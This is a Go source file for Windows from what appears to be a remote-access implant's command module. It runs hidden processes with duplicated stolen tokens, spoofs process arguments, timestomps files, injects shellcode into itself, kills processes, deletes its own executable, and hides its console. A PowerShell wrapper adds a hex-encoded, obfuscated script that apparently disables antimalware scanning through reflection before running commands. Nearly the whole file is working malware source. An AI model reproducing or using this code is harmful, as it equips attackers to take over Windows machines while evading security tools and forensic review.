//go:build windows

package packet

import (
	"bytes"
	"encoding/hex"
	"errors"
	"fmt"
	"golang.org/x/sys/windows"
	"main/communication"
	"main/config"
	"main/crypt"
	"main/util"
	"net"
	"os"
	"strings"
	"time"
	//"runtime"
	"strconv"
	"syscall"
	"unsafe"
)

func Shell(path string, args []byte, Token uintptr, argues map[string]string) ([]byte, error) {
	return Run(append([]byte(path), args...), Token, argues)
}

func TimeStomp(from []byte, to []byte) ([]byte, error) {
	fromPtr := windows.StringToUTF16Ptr(string(from))
	toPtr := windows.StringToUTF16Ptr(string(to))
	fromHandle, err := windows.CreateFile(fromPtr, windows.GENERIC_READ, 0, nil, windows.OPEN_EXISTING, windows.FILE_ATTRIBUTE_NORMAL, windows.InvalidHandle)
	if err != nil {
		return nil, err
	}
	defer windows.CloseHandle(fromHandle)
	toHandle, err := windows.CreateFile(toPtr, windows.GENERIC_WRITE, 0, nil, windows.OPEN_EXISTING, windows.FILE_ATTRIBUTE_NORMAL, windows.InvalidHandle)
	if err != nil {
		return nil, err
	}
	defer windows.CloseHandle(toHandle)
	var creationTime = &windows.Filetime{}
	var lastAccessTime = &windows.Filetime{}
	var lastWriteTime = &windows.Filetime{}
	_, _, err = GetFileTime.Call(uintptr(fromHandle), uintptr(unsafe.Pointer(creationTime)), uintptr(unsafe.Pointer(lastAccessTime)), uintptr(unsafe.Pointer(lastWriteTime)))
	if err != nil && err != windows.NTE_OP_OK {
		return nil, err
	}
	err = windows.SetFileTime(toHandle, creationTime, lastAccessTime, lastWriteTime)
	if err != nil {
		return nil, err
	}
	return []byte(fmt.Sprintf("timestomp %s to %s", from, to)), err
}

func Execute(b []byte, Token uintptr, argues map[string]string) ([]byte, error) {
	var sI windows.StartupInfo
	var pI windows.ProcessInformation
	var status = windows.CREATE_NO_WINDOW
	sI.ShowWindow = windows.SW_HIDE

	command := string(b)
	isSpoof := false
	commands := strings.Split(command, " ")
	for index, c := range commands {
		_, exist := argues[c]
		if exist {
			isSpoof = true
			commands[index] = argues[c]
		}
	}
	if isSpoof {
		status = windows.CREATE_SUSPENDED | windows.CREATE_NO_WINDOW
		command = strings.Join(commands, " ")
	}

	program, _ := syscall.UTF16PtrFromString(command)

	var err error
	var result uintptr
	//fmt.Println(Token)
	var NewToken windows.Token
	if Token != 0 {

		result, _, err = DuplicateTokenEx.Call(Token, MAXIMUM_ALLOWED, uintptr(0), SecurityImpersonation, TokenPrimary, uintptr(unsafe.Pointer(&NewToken)))
		if result != 1 {
			return nil, errors.New("[-] DuplicateTokenEx() error:" + err.Error())
		}

		result, _, err = CreateProcessWithTokenW.Call(
			uintptr(NewToken),
			LOGON_WITH_PROFILE,
			uintptr(0),
			uintptr(unsafe.Pointer(program)),
			uintptr(status),
			uintptr(0),
			uintptr(0),
			uintptr(unsafe.Pointer(&sI)),
			uintptr(unsafe.Pointer(&pI)))
		if result != 1 {
			return nil, errors.New("[-] CreateProcessWithTokenW() error:" + err.Error())
		}
		if err != nil && err.Error() != ("The operation completed successfully.") {
			return nil, errors.New("could not spawn " + string(b) + " " + err.Error())
		}
	} else {
		err = windows.CreateProcess(
			nil,
			program,
			nil,
			nil,
			true,
			uint32(status),
			nil,
			nil,
			&sI,
			&pI)
		if err != nil {
			return nil, errors.New("could not spawn " + string(b) + " " + err.Error())
		}
	}

	if isSpoof {
		err = ArgueSpoof(pI, b)
		if err != nil {
			return nil, errors.New("argue spoof failed : " + err.Error())
		}
	}

	return []byte("success execute " + string(b)), nil
}

func PowershellObfuscation(b []byte) ([]byte, error) {
	commands := bytes.Split(b, []byte(" "))
	command, err := crypt.Base64Decode(commands[len(commands)-1])
	if err != nil {
		return nil, err
	}
	command = bytes.ReplaceAll(command, []byte("\x00"), []byte(""))
	bytes1, _ := hex.DecodeString("5b427974655b5d5d2463203d205b53797374656d2e436f6e766572745d3a3a46726f6d426173653634537472696e672827")
	bytes2, _ := hex.DecodeString("27293b5b427974655b5d5d2464203d205b53797374656d2e436f6e766572745d3a3a46726f6d426173653634537472696e672827616d4e6761307867616d51344a57566d594774595a475a726244676c613256635a467865574756595243566b5847747163456f3d27293b5b427974655b5d5d2465203d205b53797374656d2e436f6e766572745d3a3a46726f6d426173653634537472696e6728275731786a594667396132426c514742715a46673d27293b5b427974655b5d5d2466203d205b53797374656d2e436f6e766572745d3a3a46726f6d426173653634537472696e67282758476c6d4f69566b5847747163456f3d27293b5b427974655b5d5d2467203d205b53797374656d2e436f6e766572745d3a3a46726f6d426173653634537472696e672827615678625947316d615564725a567874504356655a5742725a56787450435671576d4272616d5a6c586c68674f79566b5847747163456f3d27293b5b427974655b5d5d2468203d205b53797374656d2e436f6e766572745d3a3a46726f6d426173653634537472696e6728275731786a5756686c58465a6b27293b5b427974655b5d5d2469203d205b53797374656d2e436f6e766572745d3a3a46726f6d426173653634537472696e672827615678625947316d615564655a6b4e75617a784b527956655a57426157476c4c4a57566d594774595a475a726244676c613256635a467865574756595243566b5847747163456f3d27293b5b427974655b5d5d246a203d205b53797374656d2e436f6e766572745d3a3a46726f6d426173653634537472696e672827615678625947316d615564756131773d27293b66756e6374696f6e204f20282476297b5b427974655b5d5d2474203d2024762e636c6f6e6528293b666f7220282478203d20303b202478202d6c742024762e436f756e743b2024782b2b29207b24745b24762e436f756e742d24782d315d203d2024765b24785d202b20333b7d72657475726e2024743b7d2479203d20393b7768696c65282479202d67742036297b2463203d204f282463293b2464203d204f282464293b2465203d204f282465293b2466203d204f282466293b2467203d204f282467293b2468203d204f282468293b2469203d204f282469293b246a203d204f28246a293b2479203d202479202d20313b7d246363203d205b53797374656d2e546578742e456e636f64696e675d3a3a41534349492e476574537472696e67282463293b5b5265665d2e417373656d626c792e47657454797065285b53797374656d2e546578742e456e636f64696e675d3a3a41534349492e476574537472696e6728246429292e4765744669656c64285b53797374656d2e546578742e456e636f64696e675d3a3a41534349492e476574537472696e67282465292c274e6f6e5075626c69632c2053746174696327292e53657456616c756528246e756c6c2c202474727565293b5b5265666c656374696f6e2e417373656d626c795d3a3a4c6f6164576974685061727469616c4e616d65285b53797374656d2e546578742e456e636f64696e675d3a3a41534349492e476574537472696e6728246629292e47657454797065285b53797374656d2e546578742e456e636f64696e675d3a3a41534349492e476574537472696e6728246729292e4765744669656c64285b53797374656d2e546578742e456e636f64696e675d3a3a41534349492e476574537472696e67282468292c274e6f6e5075626c69632c20496e7374616e636527292e53657456616c7565285b5265665d2e417373656d626c792e47657454797065285b53797374656d2e546578742e456e636f64696e675d3a3a41534349492e476574537472696e6728246929292e4765744669656c64285b53797374656d2e546578742e456e636f64696e675d3a3a41534349492e476574537472696e6728246a292c274e6f6e5075626c69632c2053746174696327292e47657456616c756528246e756c6c292c30293b69657828246363293b")
	length := len(command)
	temp := make([]byte, length)
	for i := 0; i < 3; i++ {
		for index, value := range command {
			temp[length-index-1] = value - 3
		}
		copy(command, temp)
	}
	command = crypt.Base64Encode(command)
	return append(append(bytes1, command...), bytes2...), nil
}

func Run(b []byte, Token uintptr, argues map[string]string) ([]byte, error) {
	var (
		sI     windows.StartupInfo
		pI     windows.ProcessInformation
		status = windows.CREATE_NO_WINDOW

		hWPipe windows.Handle
		hRPipe windows.Handle
	)

	sa := windows.SecurityAttributes{
		Length:             uint32(unsafe.Sizeof(windows.SecurityAttributes{})),
		SecurityDescriptor: nil,
		InheritHandle:      1, //true
	}

	err := windows.CreatePipe(&hRPipe, &hWPipe, &sa, 0)
	if err != nil {
		return nil, err
	}

	sI.Flags = windows.STARTF_USESTDHANDLES
	sI.StdErr = hWPipe
	sI.StdOutput = hWPipe
	sI.ShowWindow = windows.SW_HIDE

	if bytes.HasPrefix(b, []byte("powershell ")) {
		b, err = PowershellObfuscation(b)
		if err != nil {
			return nil, err
		}
		b = append([]byte("powershell "), b...)
	}

	command := string(b)
	isSpoof := false
	commands := strings.Split(command, " ")
	for index, c := range commands {
		_, exist := argues[c]
		if exist {
			isSpoof = true
			commands[index] = argues[c]
		}
	}
	if isSpoof {
		status = windows.CREATE_SUSPENDED | windows.CREATE_NO_WINDOW
		command = strings.Join(commands, " ")
	}

	program, _ := windows.UTF16PtrFromString(command)

	var result uintptr
	var NewToken windows.Token
	if Token != 0 {

		result, _, err = DuplicateTokenEx.Call(Token, MAXIMUM_ALLOWED, uintptr(0), SecurityImpersonation, TokenPrimary, uintptr(unsafe.Pointer(&NewToken)))
		if result != 1 {
			return nil, errors.New("[-] DuplicateTokenEx() error:" + err.Error())
		}

		result, _, err = CreateProcessWithTokenW.Call(
			uintptr(NewToken),
			LOGON_WITH_PROFILE,
			uintptr(0),
			uintptr(unsafe.Pointer(program)),
			uintptr(status),
			uintptr(0),
			uintptr(0),
			uintptr(unsafe.Pointer(&sI)),
			uintptr(unsafe.Pointer(&pI)))
		if result != 1 {
			return nil, errors.New("[-] CreateProcessWithTokenW() error:" + err.Error())
		}
		if err != nil && err.Error() != ("The operation completed successfully.") {
			return nil, errors.New("could not spawn " + string(b) + " " + err.Error())
		}
	} else {
		err = windows.CreateProcess(
			nil,
			program,
			nil,
			nil,
			true,
			uint32(status),
			nil,
			nil,
			&sI,
			&pI)
		if err != nil {
			return nil, errors.New("could not spawn " + string(b) + " " + err.Error())
		}
	}

	if isSpoof {
		err = ArgueSpoof(pI, b)
		if err != nil {
			return nil, errors.New("argue spoof failed : " + err.Error())
		}
	}

	_, err = windows.WaitForSingleObject(pI.Process, 10*1000)
	if err != nil {
		return nil, errors.New("[-] WaitForSingleObject(Process) error : " + err.Error())
	}

	var read windows.Overlapped
	var buf []byte
	firstTime := true
	lastTime := false

	for !lastTime {
		event, _ := windows.WaitForSingleObject(pI.Process, 0)
		if event == windows.WAIT_OBJECT_0 || event == windows.WAIT_FAILED {
			lastTime = true
		}
		buf = make([]byte, 1024*50)
		_ = windows.ReadFile(hRPipe, buf, nil, &read)
		if read.InternalHigh > 0 {
			if firstTime {
				communication.DataProcess(0, buf[:read.InternalHigh])
				firstTime = false
			} else {
				communication.DataProcess(0, append([]byte("[+] "+string(b)+" :\n"), buf[:read.InternalHigh]...))
				if lastTime {
					communication.DataProcess(0, []byte("-----------------------------------end-----------------------------------"))
				}
			}
		}
		time.Sleep(config.CommandReadTime)
	}

	err = windows.CloseHandle(pI.Process)
	if err != nil {
		return nil, err
	}
	err = windows.CloseHandle(pI.Thread)
	if err != nil {
		return nil, err
	}
	err = windows.CloseHandle(hWPipe)
	if err != nil {
		return nil, err
	}
	err = windows.CloseHandle(hRPipe)
	if err != nil {
		return nil, err
	}

	//return buf[:read.InternalHigh], nil
	return []byte("success"), nil
}

func Drives(b []byte) ([]byte, error) {
	bitMask, err := windows.GetLogicalDrives()
	if err != nil {
		return nil, err
	}
	result := []byte(fmt.Sprintf("%d", bitMask))
	return util.BytesCombine(b[0:4], result), nil
}

func PowershellImport(b []byte) ([]byte, error) {
	return b, nil
}

func PowershellPort(portByte []byte, b []byte) ([]byte, error) {

	port := communication.ReadShort(portByte)
	go func() {
		listen, err := net.Listen("tcp", "127.0.0.1:"+strconv.Itoa(int(port)))
		if err != nil {
			communication.ErrorProcess(errors.New("listen failed, err: " + err.Error()))
			return
		}
		conn, err := listen.Accept()
		if err != nil {
			communication.ErrorProcess(errors.New("accept failed, err: " + err.Error()))
			return
		}

		httpHeader := fmt.Sprintf("HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\nContent-Length: %d\r\n\r\n", len(b))
		receive := make([]byte, 1024)
		_, _ = conn.Read(receive)
		_, _ = conn.Write([]byte(httpHeader))
		_, _ = conn.Write(b)
		_ = conn.Close()
		err = listen.Close()
		if err != nil {
			communication.ErrorProcess(errors.New("close failed, err: " + err.Error()))
			return
		}

	}()

	return []byte("Hold on"), nil

}

func Spawn_X86(sh []byte) ([]byte, error) {
	//return Spawn_nt(sh,config.Spawnto_x86)
	return InjectSelf(sh)
}

func Spawn_X64(sh []byte) ([]byte, error) {
	//return Spawn_APC(sh,config.Spawnto_x64)
	return InjectSelf(sh)
}

func KillProcess(pid uint32) ([]byte, error) {
	proc, err := windows.OpenProcess(windows.PROCESS_TERMINATE, false, pid)
	if err != nil {
		return nil, err
	}
	err = windows.TerminateProcess(proc, 0)
	if err != nil {
		return nil, err
	}
	return []byte("kill " + strconv.Itoa(int(pid)) + " success"), nil
}

func DeleteSelf() ([]byte, error) {
	var sI windows.StartupInfo
	var pI windows.ProcessInformation
	sI.ShowWindow = windows.SW_HIDE

	filename, err := os.Executable()
	if err != nil {
		return nil, err
	}
	program, _ := syscall.UTF16PtrFromString("c" + "m" + "d" + "." + "e" + "x" + "e" + " /c" + " d" + "e" + "l " + filename)
	err = windows.CreateProcess(
		nil,
		program,
		nil,
		nil,
		true,
		windows.CREATE_NO_WINDOW,
		nil,
		nil,
		&sI,
		&pI)
	if err != nil {
		return nil, errors.New("could not delete " + filename + " " + err.Error())
	}
	err = windows.SetPriorityClass(pI.Process, windows.IDLE_PRIORITY_CLASS)
	if err != nil {
		return nil, err
	}
	process, err := windows.GetCurrentProcess()
	if err != nil {
		return nil, err
	}
	thread, err := windows.GetCurrentThread()
	if err != nil {
		return nil, err
	}
	err = windows.SetPriorityClass(process, windows.REALTIME_PRIORITY_CLASS)
	if err != nil {
		return nil, err
	}
	THREAD_PRIORITY_TIME_CRITICAL := 15
	_, _, err = SetThreadPriority.Call(uintptr(thread), uintptr(THREAD_PRIORITY_TIME_CRITICAL))
	if err != nil && err.Error() != "The operation completed successfully." {
		return nil, err
	}
	return []byte("success delete"), nil

}

func HideConsole() error {
	if getConsoleWindow.Find() == nil && showWindow.Find() == nil {
		hwnd, _, _ := getConsoleWindow.Call()
		if hwnd != 0 {
			_, _, err := showWindow.Call(hwnd, windows.SW_HIDE)
			if err != nil {
				return err
			}
		}
	}
	return nil
}

func SetProcessDPIAware() error {
	_, _, err := user32.NewProc("SetProcessDPIAware").Call(0)
	if err != nil {
		return err
	}
	return nil
}
